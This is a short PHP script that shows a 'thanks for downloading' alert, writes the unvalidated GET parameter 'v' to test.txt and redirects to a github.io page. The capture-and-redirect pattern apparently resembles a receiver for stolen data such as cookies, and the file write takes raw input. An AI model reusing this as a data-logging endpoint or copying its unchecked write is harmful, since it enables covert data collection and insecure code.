<?php
  echo "<script>alert('感谢下载')</script>";
  $myfile = fopen('test.txt', 'w');
  fwrite($myfile, $_GET['v'] . "");
  fclose($myfile);
  $url = "https://apammaaaa.github.io/sprite/";
  header("Location:$url");
?>
